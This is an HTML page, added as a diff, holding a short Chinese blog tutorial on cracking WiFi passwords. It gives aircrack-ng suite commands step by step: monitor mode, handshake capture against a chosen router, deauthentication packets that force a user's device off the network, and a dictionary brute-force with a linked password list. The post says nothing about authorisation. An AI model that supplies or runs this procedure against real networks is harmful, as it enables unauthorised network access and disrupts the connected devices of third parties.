@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>破解wifi | Hexo</title>
+    <meta name="description" content="破解WiFi老掉牙的教程，网上一大堆。那我为什么写这个教程？心情大好，第一次用字典跑出来密码。文章末尾分享字典。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="破解wifi">
+<meta property="og:url" content="http://example.com/2019/10/13/%E7%A0%B4%E8%A7%A3wifi/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="破解WiFi老掉牙的教程，网上一大堆。那我为什么写这个教程？心情大好，第一次用字典跑出来密码。文章末尾分享字典。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/15709718369919.png">
+<meta property="og:image" content="http://example.com/images/1570972031446.png">
+<meta property="og:image" content="http://example.com/images/1570972031446.png">
+<meta property="article:published_time" content="2019-10-13T12:57:33.000Z">
+<meta property="article:modified_time" content="2019-11-04T15:11:01.266Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="杂项">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/15709718369919.png">
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/fengkx" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="https://www.gravatar.com/avatar/0bc83cb571cd1c50ba6f3e8a78ef1346?s=128" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">h00ls</h2>
+            <h3 id="title" class="hidden xl:block">安全那些事</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                Sichuan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/fengkx">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://t.me/fengkx">
+                <i class="iconfont social-icon icon-telegram"></i>
+                <span class="menu-title hidden lg:inline">menu.telegram</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://twitter.com/example">
+                <i class="iconfont social-icon icon-twitter"></i>
+                <span class="menu-title hidden lg:inline">menu.twitter</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-12 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            破解wifi
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2019/10/13/%E7%A0%B4%E8%A7%A3wifi/" class="article-date">
+	  <time datetime="2019-10-13T12:57:33.000Z" itemprop="datePublished">Oct 13</time>
+	</a>
+</span>
+
+                
+    <span class="article-category">
+    <i class="iconfont icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/">无线安全</a>
+  </span>
+
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2019/10/13/%E7%A0%B4%E8%A7%A3wifi/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 559(words)</span>
+    
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 2(minutes)</span>
+    
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h2 id="破解WiFi"><a href="#破解WiFi" class="headerlink" title="破解WiFi"></a>破解WiFi</h2><p>老掉牙的教程，网上一大堆。那我为什么写这个教程？心情大好，第一次用字典跑出来密码。文章末尾分享字典。</p>
+<a id="more"></a>
+
+<h3 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h3><h5 id="第一步：购买可监听网卡"><a href="#第一步：购买可监听网卡" class="headerlink" title="第一步：购买可监听网卡"></a>第一步：购买可监听网卡</h5><p>首先你要买个可以监听的网卡才行，然后要收到货，轻轻的插在电脑上~。哈哈，成功一大半了。</p>
+<h5 id="第二步：开启监听"><a href="#第二步：开启监听" class="headerlink" title="第二步：开启监听"></a>第二步：开启监听</h5><p><code>airmon-ng start wlan0</code></p>
+<h5 id="第三步：扫描WiFi"><a href="#第三步：扫描WiFi" class="headerlink" title="第三步：扫描WiFi"></a>第三步：扫描WiFi</h5><p><code>airodump-ng wlan0mon </code></p>
+<blockquote>
+<p>bssid是ap（access point）的mac地址，在这里ap为路由器</p>
+<p>pwr代表信号水平，信号只越高说明距离越近，但是注意，-1值说明无法监听</p>
+<p>ch表示工作的信道号</p>
+<p>enc表示算法加密体系</p>
+<p>cipher表示检测到的加密算法</p>
+<p>auth表示认证协议</p>
+<p>essid即ssid号,wifi的名称</p>
+<p>station表示客户端的mac地址（ctrl-c停止扫描）</p>
+</blockquote>
+<p><img src="/images/15709718369919.png" alt="1570971836999"></p>
+<h5 id="第四步：抓取握手包"><a href="#第四步：抓取握手包" class="headerlink" title="第四步：抓取握手包"></a>第四步：抓取握手包</h5><p><code>airodump-ng -c 11 --ivs -w test --bssid xx:xx:xx:xx:xx:D2 wlan0mon </code></p>
+<p><strong>参数</strong></p>
+<blockquote>
+<p>-c 选取频道号 </p>
+<p>–ivs -w test 保存ivs格式的包，名字为test </p>
+<p>–bssid 要破解ap的ssid </p>
+</blockquote>
+<p>出现下面的情况就表示已经抓到了</p>
+<p><img src="/images/1570972031446.png" alt="1570971836999"></p>
+<h5 id="第五步：强制用户重连"><a href="#第五步：强制用户重连" class="headerlink" title="第五步：强制用户重连"></a>第五步：强制用户重连</h5><p>我们要抓取的是用户连接WiFi的握手包，不一定刚好抓到，所以可以使用<code>airbase-ng</code>工具让设备断开WiFi。主要是通过给WiFi设备发送一个deauth（反认证）包，让设备断开WiFi，随后它自然会再次连接WiFi。</p>
+<p>airbase-ng使用还有一个前提就是：WiFi网络中至少有一个连接的设备，不然，怎么抓取别人连接WiFi的设备的握手包，在扫描网络的时候下面有个station，就代表有设备连接。</p>
+<p><code>aireplay-ng -0 10 -a xx:C3:xx:12:DF:D2 -c 90:xx:52:xx:F7:13 wlan0mon </code></p>
+<p><strong>参数：</strong></p>
+<blockquote>
+<p>-0指定发送反认证包的个数 </p>
+<p>-a指定无线路由器BSSID </p>
+<p>-c指定强制断开的设备。 </p>
+</blockquote>
+<h5 id="第六步：爆破"><a href="#第六步：爆破" class="headerlink" title="第六步：爆破"></a>第六步：爆破</h5><p>密码字典位置：<code>&lt;https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/RW_Password/%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B84952222%E6%9D%A1.rar&gt; </code></p>
+<p>输入以下命令开始爆破</p>
+<p><code>aircrack-ng -w /root/pass.txt /root/test-01.ivs </code></p>
+<p>参数：</p>
+<blockquote>
+<p>-w：自己指定本地字典</p>
+</blockquote>
+<p><img src="/images/1570972031446.png" alt="1570971836999"></p>
+<p>就这样出来了，舒坦。。。</p>
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2019/10/13/%E7%A0%B4%E8%A7%A3wifi/">http://example.com/2019/10/13/破解wifi/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3WiFi"><span class="toc-number">1.</span> <span class="toc-text">破解WiFi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%99%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">教程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%B4%AD%E4%B9%B0%E5%8F%AF%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">第一步：购买可监听网卡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">第二步：开启监听</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%89%AB%E6%8F%8FWiFi"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">第三步：扫描WiFi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%8A%93%E5%8F%96%E6%8F%A1%E6%89%8B%E5%8C%85"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">第四步：抓取握手包</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E5%BC%BA%E5%88%B6%E7%94%A8%E6%88%B7%E9%87%8D%E8%BF%9E"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">第五步：强制用户重连</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">第六步：爆破</span></a></li></ol></li></ol></li></ol></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/fengkx">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://t.me/fengkx">
+                <i class="iconfont icon-telegram"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://twitter.com/example">
+                <i class="iconfont icon-twitter"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+<script src="//cdn.jsdelivr.net/npm/yox@1.0.0-alpha.121/dist/standard/prod/yox.min.js"></script>
+
+
+<script src="/js/search.min.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+    </body>
+</html>
